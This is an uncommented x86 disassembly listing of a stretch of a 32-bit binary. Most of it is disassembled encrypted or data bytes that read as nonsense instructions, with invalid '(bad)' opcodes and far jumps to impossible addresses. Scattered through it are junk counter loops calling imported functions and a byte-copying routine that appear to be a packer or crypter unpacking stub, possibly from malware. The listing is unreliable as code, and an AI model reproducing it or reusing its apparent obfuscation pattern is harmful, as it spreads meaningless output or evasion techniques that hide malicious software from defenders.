  402912:	sbb    BYTE PTR [esi],cl
  402914:	dec    eax
  402915:	in     al,dx
  402916:	clc    
  402917:	cli    
  402918:	jo     0x402971
  40291a:	push   ecx
  40291b:	aas    
  40291c:	popf   
  40291d:	loope  0x4028e2
  40291f:	xchg   DWORD PTR [eax-0x3d],eax
  402922:	push   cs
  402923:	or     ch,BYTE PTR [ebx]
  402925:	and    eax,0xf2b1d127
  40292a:	aas    
  40292b:	pop    ecx
  40292c:	lods   al,BYTE PTR ds:[esi]
  40292d:	dec    ebp
  40292e:	fmul   st(4),st
  402930:	dec    DWORD PTR [ecx+ebx*1]
  402933:	pop    es
  402934:	push   ebx
  402935:	ja     0x40298b
  402937:	or     ch,bl
  402939:	mov    ds:0xc4310e12,eax
  40293e:	xor    BYTE PTR [edx],ah
  402940:	mov    BYTE PTR [esi],dh
  402942:	mov    ebp,0x2b940b34
  402947:	stos   DWORD PTR es:[edi],eax
  402948:	stos   DWORD PTR es:[edi],eax
  402949:	scas   al,BYTE PTR es:[edi]
  40294a:	pop    esp
  40294b:	mov    ebx,0x6364cda5
  402950:	int3   
  402951:	and    BYTE PTR [edi+0x39],ah
  402954:	aam    0x8d
  402956:	mov    WORD PTR [esi],fs
  402958:	jge    0x40297a
  40295a:	xor    eax,edi
  40295c:	pop    ecx
  40295d:	push   ebp
  40295e:	adc    BYTE PTR [esi],cl
  402960:	pushf  
  402961:	push   ecx
  402962:	loopne 0x4029cc
  402964:	je     0x40291d
  402966:	cmc    
  402967:	mov    ebx,0x975681a3
  40296c:	and    BYTE PTR [edi+0x4587a600],bh
  402972:	xchg   ebx,eax
  402973:	push   ds
  402974:	xor    eax,0x5e56aed5
  402979:	mov    al,ds:0xdbcbd36b
  40297e:	dec    edx
  40297f:	adc    al,0xd6
  402981:	fwait
  402982:	add    eax,0x50dd6a8a
  402987:	rol    BYTE PTR [esi-0x54975612],0xee
  40298e:	xor    bh,bh
  402990:	cmp    dh,BYTE PTR [edx-0x19667abc]
  402996:	or     al,0xaa
  402998:	es sbb BYTE PTR gs:[esi+eiz*4+0x27],ah
  40299e:	pop    ds
  40299f:	call   0x584d279c
  4029a4:	xor    DWORD PTR ds:0xb89087f5,edi
  4029aa:	les    edx,FWORD PTR [edi+edi*8]
  4029ad:	cmp    ecx,DWORD PTR [esi-0x3e]
  4029b0:	sub    ebp,0x301b2a3
  4029b6:	or     DWORD PTR [ecx+0x2c],eax
  4029b9:	sbb    edi,eax
  4029bb:	(bad)  
  4029bd:	pushf  
  4029be:	repz (bad) 
  4029c1:	jl     0x6ab619d5
  4029c7:	out    dx,eax
  4029c8:	push   esp
  4029c9:	pop    edi
  4029ca:	stos   DWORD PTR es:[edi],eax
  4029cb:	outs   dx,DWORD PTR ds:[esi]
  4029cc:	xor    edx,0x7c
  4029cf:	adc    eax,0xc65b68db
  4029d4:	ins    DWORD PTR es:[edi],dx
  4029d5:	call   0xdf3945b
  4029da:	add    BYTE PTR [edx],cl
  4029dc:	shl    DWORD PTR [ebp+0x3cd528c1],cl
  4029e2:	loop   0x402992
  4029e4:	retf   0x3ba
  4029e7:	mov    ebp,0x8b81777e
  4029ec:	add    DWORD PTR ds:0xfd0b6f53,edx
  4029f2:	mov    esi,0xa2195233
  4029f7:	xchg   esp,eax
  4029f8:	mov    ds,WORD PTR [ebx-0x2b]
  4029fb:	mov    ds:0x2e99fdbd,al
  402a00:	pop    esp
  402a01:	jmp    0x377255b7
  402a06:	xchg   esp,eax
  402a07:	jge    0x402a43
  402a09:	and    dh,BYTE PTR [esp+eax*4+0x637a000f]
  402a10:	test   DWORD PTR [edi],esp
  402a12:	xchg   ebp,eax
  402a13:	in     eax,0x5e
  402a15:	inc    ebp
  402a16:	mov    dl,BYTE PTR [ecx-0x7f]
  402a19:	and    eax,0x434687
  402a1e:	add    BYTE PTR [eax],al
  402a20:	add    BYTE PTR [eax],al
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434687
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434687,edx
  402a34:	cmp    DWORD PTR ds:0x434687,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434687,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4345e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434687,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434687
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434687,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4345ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43463b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434677,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434677
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434677,ecx
  402aac:	cmp    DWORD PTR ds:0x434677,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434677,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43470f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4346fb
  402ae8:	or     DWORD PTR ds:0x4346c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4346b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4346c3,0x434603
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	inc    BYTE PTR [ebx+ecx*1+0x973d80d]
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b66
  402b2c:	fisttp DWORD PTR [eax-0x7b]
  402b2f:	out    0x6d,al
  402b31:	cmc    
  402b32:	sub    al,dh
  402b34:	dec    eax
  402b35:	fnstsw WORD PTR [eax]
  402b37:	fndisi(8087 only) 
  402b39:	fwait
  402b3a:	test   BYTE PTR [ecx-0x4c],dl
  402b3d:	cmp    al,0x5e
  402b3f:	dec    ebx
  402b40:	sub    al,BYTE PTR [eax]
  402b42:	hlt    
  402b43:	das    
  402b44:	sbb    dl,BYTE PTR [edi+0x6d5340f7]
  402b4a:	popf   
  402b4b:	xor    edx,eax
  402b4d:	lods   al,BYTE PTR ds:[esi]
  402b4e:	or     BYTE PTR [esi-0x36],bh
  402b51:	scas   al,BYTE PTR es:[edi]
  402b52:	rcl    ebx,cl
  402b54:	xchg   cl,cl
  402b56:	sub    esi,DWORD PTR [ecx-0x1b]
  402b59:	inc    edx
  402b5a:	ins    BYTE PTR es:[edi],dx
  402b5b:	mov    esp,0xfa187184
  402b60:	fwait
  402b61:	hlt    
  402b62:	xor    bl,BYTE PTR [ebx]
  402b64:	call   0xf373:0x6a4f980f
  402b6b:	push   ecx
  402b6c:	ror    DWORD PTR [ebx],1
  402b6e:	lahf   
  402b6f:	mov    dl,0xd0
  402b71:	gs push edx
  402b73:	stos   DWORD PTR es:[edi],eax
  402b74:	pop    ebx
  402b75:	aad    0xb3
  402b77:	lods   al,BYTE PTR ds:[esi]
  402b78:	jg     0x402b16
  402b7a:	stc    
  402b7b:	fidiv  DWORD PTR [edx+0x54]
  402b7e:	je     0x402b5d
  402b80:	cmc    
  402b81:	(bad)  
  402b82:	push   DWORD PTR [eax+0x4aa7de2c]
  402b88:	pushf  
  402b89:	mov    bl,0xc8
  402b8b:	inc    ebx
  402b8c:	adc    edx,edx
  402b8e:	mov    ah,0x3e
  402b90:	add    DWORD PTR [edx+0x4],esp
  402b93:	xchg   ebp,eax
  402b94:	test   bh,bl
  402b96:	mov    dh,0x61
  402b98:	or     ebx,DWORD PTR [edx-0x55]
  402b9b:	out    0x8e,eax
  402b9d:	jp     0x402b7a
  402b9f:	fimul  DWORD PTR [edx+0xcbfb200]
  402ba5:	inc    ebx
  402ba6:	icebp  
  402ba7:	sub    al,0xb3
  402ba9:	xor    ebp,esi
  402bab:	adc    al,0x9c
  402bae:	icebp  
  402baf:	out    dx,al
  402bb0:	adc    DWORD PTR [esi+0x16],esi
  402bb3:	lods   al,BYTE PTR ds:[esi]
  402bb4:	jecxz  0x402b73
  402bb6:	pop    ds
  402bb7:	sahf   
  402bb8:	dec    eax
  402bb9:	and    eax,0xcd1b4811
  402bbe:	push   cs
  402bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bc0:	sub    esp,DWORD PTR [ebp-0x6f1ea449]
  402bc6:	enter  0x24e1,0xeb
  402bca:	(bad)  
  402bcb:	mov    esp,0xe2836760
  402bd0:	inc    esi
  402bd1:	mov    eax,ds:0x65e4c4c0
  402bd6:	test   DWORD PTR [eax+0x132b4ec3],edx
  402bdc:	pop    ebp
  402bdd:	popa   
  402bde:	iret   
  402bdf:	mov    esi,0x2baad8d5
  402be4:	fsubp  st(2),st
  402be6:	mov    dh,0x64
  402be8:	setns  BYTE PTR [ebp+0x75]
  402bec:	fwait
  402bed:	and    BYTE PTR [ebx],dl
  402bef:	push   esi
  402bf0:	cmp    bl,dh
  402bf2:	push   ecx
  402bf3:	or     eax,0xc822f5de
  402bf8:	push   eax
  402bf9:	fadd   QWORD PTR [ebx]
  402bfb:	mov    BYTE PTR [ecx+edi*4-0x4f4f468e],0xd2
  402c03:	sbb    edi,DWORD PTR [eax]
  402c05:	in     al,0x99
  402c07:	popf   
  402c08:	jge    0x402c47
  402c0a:	shl    edx,cl
  402c0c:	loope  0x402c5b
  402c0e:	push   0x15d88584
  402c13:	retf   
  402c14:	sub    DWORD PTR [ecx-0x6eff3355],0xffffffce
  402c1b:	nop
  402c1c:	xor    al,0x8d
  402c1e:	or     DWORD PTR [ebx-0x7d],edx
  402c21:	pushf  
  402c22:	mov    ebx,0x299d2c4e
  402c27:	cli    
  402c28:	shl    BYTE PTR ds:[eax+0x1a87c839],0xc9
  402c30:	shl    cl,1
  402c32:	inc    ecx
  402c33:	mov    esi,0x4f46665f
  402c38:	inc    esi
  402c39:	jg     0x402c82
  402c3b:	lods   al,BYTE PTR ds:[esi]
  402c3c:	sbb    eax,0x1f8e263c
  402c41:	pop    ebp
  402c42:	in     eax,0x2e
  402c44:	inc    ebx
  402c45:	inc    ebx
  402c46:	sbb    ebp,ebp
  402c48:	or     ch,ch
  402c4a:	aad    0x3
  402c4c:	(bad)  
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434607,0x0
  402c5f:	mov    eax,ds:0x434607
  402c64:	inc    eax
  402c65:	mov    ds:0x434607,eax
  402c6a:	cmp    DWORD PTR ds:0x434607,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434607,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4345e7,0x434713
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	scas   al,BYTE PTR es:[edi]
  402ce7:	jp     0x402c6d
  402ce9:	loopne 0x402cfe
  402ceb:	or     edi,DWORD PTR [esi+0x7e]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402cab
  402cf3:	add    al,0xd7
  402cf5:	jno    0x402c9f
  402cf7:	xchg   ebx,eax
  402cf8:	in     eax,dx
  402cf9:	(bad)  
  402cfa:	sub    DWORD PTR [esi+0x630681e8],ebp
  402d00:	mov    bh,0x79
  402d02:	in     al,dx
  402d03:	add    DWORD PTR [esi],ebx
  402d05:	call   0x8a45c6aa
  402d0a:	ss jle 0x402d0b
  402d0d:	add    DWORD PTR [eax+0x4622decb],eax
  402d13:	sbb    eax,esi
  402d15:	out    0x9a,al
  402d17:	rcl    DWORD PTR [eax+ebp*4-0x11],1
  402d1b:	(bad)  
  402d1c:	cmp    BYTE PTR [eax+0x33ed3e7c],dl
  402d22:	xlat   BYTE PTR ds:[ebx]
  402d23:	ret    
  402d24:	pop    esi
  402d25:	mov    edi,0x3fd4a10d
  402d2a:	inc    eax
  402d2b:	fwait
  402d2c:	dec    ebx
  402d2d:	into   
  402d2e:	dec    ebp
  402d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d30:	mov    al,ds:0x93c00cf9
  402d35:	sbb    DWORD PTR [eax],edi
  402d37:	(bad)  
  402d39:	dec    edx
  402d3a:	in     eax,dx
  402d3b:	push   ebx
  402d3c:	fist   WORD PTR [ecx+0x38]
  402d3f:	jecxz  0x402ce3
  402d41:	(bad)  
  402d42:	rcl    BYTE PTR [eax+0xded76b6],1
  402d48:	cmp    dl,BYTE PTR [eax]
  402d4a:	dec    eax
  402d4b:	cmp    DWORD PTR [eax+0x2a],edx
  402d4e:	loop   0x402da7
  402d50:	or     BYTE PTR [ecx-0x79598943],ah
  402d56:	xchg   ebp,eax
  402d57:	idiv   BYTE PTR [ebp-0x69]
  402d5a:	outs   dx,BYTE PTR ds:[esi]
  402d5b:	inc    esp
  402d5c:	push   es
  402d5d:	jns    0x402cea
  402d5f:	call   0x70bbce6a
  402d64:	dec    edx
  402d65:	xor    esp,DWORD PTR [ecx+0x5ffb3b80]
  402d6b:	push   eax
  402d6c:	mov    DWORD PTR [edx-0x21],0x4f7c953d
  402d73:	ficomp WORD PTR [esi+0x3e476feb]
  402d79:	push   es
  402d7a:	jge    0x402db6
  402d7c:	loopne 0x402dde
  402d7e:	mov    WORD PTR [eax-0x392ace1],fs
  402d84:	aaa    
  402d85:	outs   dx,BYTE PTR ds:[esi]
  402d86:	xchg   esp,eax
  402d87:	xchg   esi,eax
  402d88:	je     0x402d96
  402d8a:	rcr    BYTE PTR [ebx+0x52],1
  402d8d:	add    eax,0xd1d9f88f
  402d92:	shr    BYTE PTR [esi+0x2fc43af2],1
  402d98:	stos   BYTE PTR es:[edi],al
  402d99:	mul    ebx
  402d9b:	cdq    
  402d9c:	sub    dh,BYTE PTR [edx+esi*8+0x247e4f7e]
  402da3:	mov    ebx,edi
  402da5:	idiv   DWORD PTR [ecx+esi*4-0x46d4d47e]
  402dac:	in     al,0x78
  402dae:	(bad)  
  402daf:	push   edi
  402db0:	pop    esp
  402db1:	cwd    
  402db3:	sub    esp,DWORD PTR [ecx-0x283cc80f]
  402db9:	cld    
  402dba:	nop
  402dbb:	in     al,0x78
  402dbd:	adc    esi,DWORD PTR [ecx-0x20911875]
  402dc3:	push   ss
  402dc4:	adc    BYTE PTR [edi+eiz*1-0x2f5c728e],dl
  402dcb:	dec    edi
  402dcc:	mov    ecx,0x759cc4b5
  402dd1:	call   0x2b3:0xf0969693
  402dd8:	lock add esi,DWORD PTR [ebx-0x2d4188c]
  402ddf:	or     DWORD PTR [edx+0xff88321],0xffffffd0
  402de6:	add    dh,BYTE PTR [esi]
  402de8:	mov    eax,ds:0x21258f5e
  402ded:	call   0x1974c4ee
  402df2:	fs clc 
  402df4:	or     esp,DWORD PTR [ebx]
  402df6:	in     al,dx
  402df7:	sub    esi,DWORD PTR [eax-0x35]
  402dfa:	repz loopne 0x402de6
  402dfd:	jmp    0xe27d:0x736f4966
  402e04:	lds    ecx,FWORD PTR ds:0xb89b5712
  402e0a:	push   ebx
  402e0b:	(bad)  
  402e0d:	fld    TBYTE PTR [ebx-0x749b3b41]
  402e13:	pop    ebp
  402e14:	or     al,0x33
  402e16:	rol    DWORD PTR [ebx],0xc2
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434677,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    al,BYTE PTR [ebp+0x330bb080]
  402e97:	adc    al,0x7e
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e1f
  402e9f:	cs push ss
  402ea1:	sub    DWORD PTR [edi],edi
  402ea3:	xor    al,0xbb
  402ea5:	add    ebp,DWORD PTR [esi-0x42a629e8]
  402eab:	call   0x1b82:0x572bd324
  402eb2:	pop    eax
  402eb3:	es jl  0x402e60
  402eb6:	pushf  
  402eb7:	xchg   ebp,eax
  402eb8:	sbb    al,0x96
  402eba:	mov    edi,0x760ec076
  402ebf:	pop    ecx
  402ec0:	mov    al,0x30
  402ec2:	adc    BYTE PTR [ebp+0x6528f333],cl
  402ec8:	cs int 0xe2
  402ecb:	int3   
  402ecc:	aam    0x5d
  402ece:	clc    
  402ecf:	(bad)  
  402ed0:	cs push esi
  402ed2:	ja     0x402f2f
  402ed4:	inc    ecx
  402ed5:	and    eax,0x7287bbd0
  402eda:	sub    BYTE PTR [ecx-0x27],ah
  402edd:	jns    0x402f38
  402edf:	jno    0x402f2d
  402ee1:	fdiv   st,st(0)
  402ee3:	retf   0x4c6f
  402ee6:	jmp    0x402eed
  402ee8:	ja     0x402ec0
  402eea:	std    
  402eeb:	mov    cl,0x3f
  402eed:	push   ds
  402eee:	sub    al,0xb9
  402ef0:	jns    0x402f6c
  402ef2:	sti    
  402ef3:	imul   esi,DWORD PTR [edx-0x1014181f],0x20bb62ae
  402efd:	pushf  
  402efe:	push   eax
  402eff:	dec    ebx
  402f00:	cdq    
  402f01:	rol    BYTE PTR [edx-0x2cd7249b],cl
  402f07:	and    al,0x61
  402f09:	jge    0x402eba
  402f0b:	mov    dl,0xa6
  402f0d:	mov    edi,0xf717472e
  402f12:	mov    WORD PTR [edx-0x38bfc7e4],ds
  402f18:	stos   DWORD PTR es:[edi],eax
  402f19:	pop    ss
  402f1a:	pop    eax
  402f1b:	ret    0x29e3
  402f1e:	and    eax,0x70c41993
  402f23:	retf   
  402f24:	add    eax,0xe04e5561
  402f29:	xor    BYTE PTR [eax],bl
  402f2b:	or     al,0xd8
  402f2d:	push   ebp
  402f2e:	stos   DWORD PTR es:[edi],eax
  402f2f:	in     eax,dx
  402f30:	xor    DWORD PTR [esi+edx*8+0x1c],ebp
  402f34:	popaw  
  402f36:	js     0x402f82
  402f38:	add    cl,BYTE PTR [eax+0x283a3ee]
  402f3e:	dec    ebp
  402f3f:	mov    BYTE PTR [edi-0x66],dl
  402f42:	pop    esi
  402f43:	ficomp WORD PTR [ecx+0x17397dce]
  402f49:	in     al,dx
  402f4a:	sahf   
  402f4b:	xchg   esi,eax
  402f4c:	ror    DWORD PTR [eax],0x64
  402f4f:	jg     0x402ee0
  402f51:	jge    0x402f6a
  402f53:	(bad)  
  402f54:	xchg   edi,eax
  402f55:	jne    0x402f1b
  402f57:	retf   
  402f58:	imul   edi,DWORD PTR [edi],0x153131b
  402f5e:	pop    eax
  402f5f:	inc    ecx
  402f60:	lock mov dl,0xf9
  402f63:	lods   eax,DWORD PTR ds:[esi]
  402f64:	inc    esp
  402f65:	shr    DWORD PTR [ebx],0x15
  402f68:	es sti 
  402f6a:	imul   eax,DWORD PTR [edi],0xffffffb5
  402f6d:	ds stos DWORD PTR es:[edi],eax
  402f6f:	inc    esp
  402f70:	sahf   
  402f71:	xchg   ebx,eax
  402f72:	int    0xc5
  402f74:	(bad)  
  402f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f76:	mov    ds:0xebd8f7d4,eax
  402f7b:	mov    ch,0xe9
  402f7d:	pop    esi
  402f7e:	fmul   QWORD PTR [eax]
  402f80:	retf   0x96fc
  402f83:	in     al,dx
  402f84:	in     eax,dx
  402f85:	push   ebp
  402f86:	imul   esi,DWORD PTR [edx-0x4337fed1],0xffffff91
  402f8d:	jmp    0x402f40
  402f8f:	adc    DWORD PTR [eax-0x12],edx
  402f92:	and    BYTE PTR cs:[edi+ecx*4+0x57006302],0xeb
  402f9b:	adc    edx,ecx
  402f9d:	lds    esi,FWORD PTR [ebx+0x7a5e6dda]
  402fa3:	add    eax,0x634dc676
  402fa8:	test   edx,ebp
  402faa:	mov    ebx,0xe997dc8a
  402faf:	and    cl,dl
  402fb1:	mov    ah,0x32
  402fb3:	iret   
  402fb4:	(bad)  
  402fb5:	jge    0x402f4e
  402fb7:	jmp    0xa54f90d8
  402fbc:	xchg   edi,eax
  402fbd:	cmc    
  402fbe:	sar    BYTE PTR [ecx-0x544c9e9c],cl
  402fc4:	das    
  402fc5:	aaa    
  402fc6:	push   esp
  402fc7:	dec    edx
  402fc8:	aas    
  402fc9:	and    DWORD PTR [eax-0x1fb52b80],0xe1ce3544
  402fd3:	inc    esi
  402fd4:	inc    edx
  402fd5:	dec    edi
  402fd6:	icebp  
  402fd7:	jns    0x403054
  402fd9:	sub    al,dh
  402fdb:	call   0xdc49:0x44317414
  402fe2:	test   DWORD PTR ss:[ebx+0x2882df74],eax
  402fe9:	daa    
  402fea:	test   DWORD PTR [edi+0x21],edx
  402fed:	jb     0x402ff7
  402fef:	inc    ebp
  402ff0:	pushf  
  402ff1:	mov    ds:0x8c281fc1,eax
  402ff6:	cs ja  0x402f81
  402ff9:	xchg   ebp,eax
  402ffa:	add    DWORD PTR [edx],esp
  402ffc:	mov    dh,0xe3
  402ffe:	cmp    BYTE PTR [edx],0xf9
  403001:	xor    bl,BYTE PTR [edx+0x7ca3b59]
  403007:	xchg   edx,esp
  403009:	adc    esi,DWORD PTR [edx]
  40300b:	cmp    DWORD PTR [edi+0x68],eax
  40300e:	pop    ebp
  40300f:	push   cs
  403010:	lahf   
  403011:	jne    0x403082
  403013:	push   ss
  403014:	pop    ss
  403015:	pop    edx
  403016:	nop
  403017:	sar    DWORD PTR [eax-0x7a],1
  40301a:	mov    al,0xaa
  40301c:	jae    0x403076
  40301e:	push   0x18
  403020:	(bad)
  403023:	xor    dh,dl
  403025:	sbb    eax,DWORD PTR ds:0x1e0ad347
  40302b:	test   ah,0xc8
  40302e:	fwait
  40302f:	fs mov cl,0xae
  403032:	xor    dl,dh
  403034:	das    
  403035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403036:	adc    eax,0x64fe6ad1
  40303b:	cmp    al,0xa1
  40303d:	xchg   edi,eax
  40303e:	add    eax,0x774a16e3
  403043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403044:	jmp    0x402fdb
  403046:	in     al,dx
  403047:	push   ebx
  403048:	(bad)  
  403049:	ja     0x4030b4
  40304b:	push   es
  40304c:	push   ss
  40304d:	or     DWORD PTR [edi-0x4bee7582],ebx
  403053:	mov    BYTE PTR [eax+0x31],bh
  403056:	push   ds
  403057:	push   es
  403058:	dec    esp
  403059:	sub    al,0x4e
  40305b:	mov    bl,0x83
  40305d:	adc    eax,0xfa9206e2
  403062:	xor    eax,0xf65729ef
  403067:	icebp  
  403068:	test   BYTE PTR [eax],bh
  40306a:	lea    ebp,[eax+0x520a47d9]
  403070:	repnz out 0xef,al
  403073:	mov    cs,edx
  403075:	int    0xdc
  403077:	ret    
  403078:	jbe    0x403036
  40307a:	sbb    al,0x1d
  40307c:	(bad)  
  40307d:	mov    ecx,0xfbff0db5
  403082:	mov    ss,esi
  403084:	push   ds
  403085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403087:	out    dx,al
  403088:	push   esi
  403089:	dec    ecx
  40308a:	mov    esi,0x4acfc046
  40308f:	pop    ebx
  403090:	adc    DWORD PTR [ecx-0x2a],ebp
  403093:	jbe    0x4030b0
  403095:	mov    ds:0xe33803b8,al
  40309a:	not    DWORD PTR [ebx]
  40309c:	and    cl,BYTE PTR [ebx+ecx*1]
  40309f:	rcl    DWORD PTR [eax],1
  4030a1:	bswap  ecx
  4030a3:	nop
  4030a4:	lods   al,BYTE PTR ds:[esi]
  4030a5:	aad    0xfe
  4030a7:	rsm    
  4030a9:	repnz lods eax,DWORD PTR ds:[esi]
  4030ab:	(bad)  
  4030ac:	pop    esp
  4030ad:	ins    DWORD PTR es:[edi],dx
  4030ae:	ret    0x4655
  4030b1:	push   cs
  4030b2:	test   eax,0x17bc32b3
  4030b7:	aad    0xc3
  4030b9:	jmp    0xe2cb:0x4208ed2f
  4030c0:	es jl  0x40305e
  4030c3:	inc    edi
  4030c4:	inc    ecx
  4030c5:	push   edx
  4030c6:	mov    eax,ds:0x36de78bc
  4030cb:	cdq    
  4030cc:	ss push edx
  4030ce:	nop
  4030cf:	and    ebp,esi
  4030d1:	out    0x5d,eax
  4030d3:	addr16 pop esi
  4030d5:	xchg   DWORD PTR [ebx+0x25],ecx
  4030d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030d9:	jb     0x403140
  4030db:	pusha  
  4030dc:	jge    0x4030a8
  4030de:	xchg   ebx,eax
  4030df:	dec    eax
  4030e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030e1:	(bad)  
  4030e2:	and    cl,ch
  4030e4:	inc    edx
  4030e5:	mov    gs,WORD PTR [ecx]
  4030e7:	mul    BYTE PTR [ecx+0x3bcd8277]
  4030ed:	out    dx,eax
  4030ee:	pop    ecx
  4030ef:	mov    BYTE PTR [edi-0x27],dl
  4030f2:	mov    esi,DWORD PTR [esi]
  4030f4:	or     al,0xe6
  4030f6:	xor    DWORD PTR [ecx-0x7c],0x160c8535
  4030fd:	daa    
  4030fe:	xor    eax,0x27d59805
  403103:	fdiv   QWORD PTR [edx]
  403105:	add    cl,dl
  403107:	neg    BYTE PTR [eax+ebp*4+0x3d4dbd13]
  40310e:	bound  si,DWORD PTR [edi]
  403111:	nop
  403112:	mov    eax,DWORD PTR [esi+0x55221c72]
  403118:	jno    0x403118
  40311a:	push   edi
  40311b:	mov    esi,0x96b7fa6b
  403120:	xchg   ebp,eax
  403121:	(bad)  
  403122:	popa   
  403123:	fwait
  403124:	mov    cl,0xa3
  403126:	fstp   TBYTE PTR [edi+eax*4-0x30cdd64d]
  40312d:	xchg   di,ax
  40312f:	int    0x96
  403131:	fimul  DWORD PTR [eax+edi*2+0x1789f934]
  403138:	fs inc ecx
  40313a:	jns    0x40314f
  40313c:	popa   
  40313d:	dec    eax
  40313e:	and    al,BYTE PTR [ecx-0x108b1a38]
  403144:	jb     0x403124
  403146:	cmp    eax,0xecc41111
  40314b:	fcos   
  40314d:	pop    edx
  40314e:	xor    edx,eax
  403150:	dec    eax
  403151:	mov    dh,0xc3
  403153:	push   0xf5016364
  403158:	test   eax,0x72c42622
  40315d:	lods   eax,DWORD PTR ds:[esi]
  40315e:	sbb    ah,ah
  403160:	lods   eax,DWORD PTR ds:[esi]
  403161:	(bad)  
  403162:	ins    DWORD PTR es:[edi],dx
  403163:	xor    edx,0x8644d3b6
  403169:	adc    al,0xbf
  40316b:	push   esi
  40316c:	clc    
  40316d:	xchg   bl,bh
  40316f:	xchg   DWORD PTR ss:[edi+0x60],esi
  403173:	js     0x4031bb
  403175:	jp     0x403145
  403177:	popa   
  403178:	inc    esp
  403179:	in     eax,0x1d
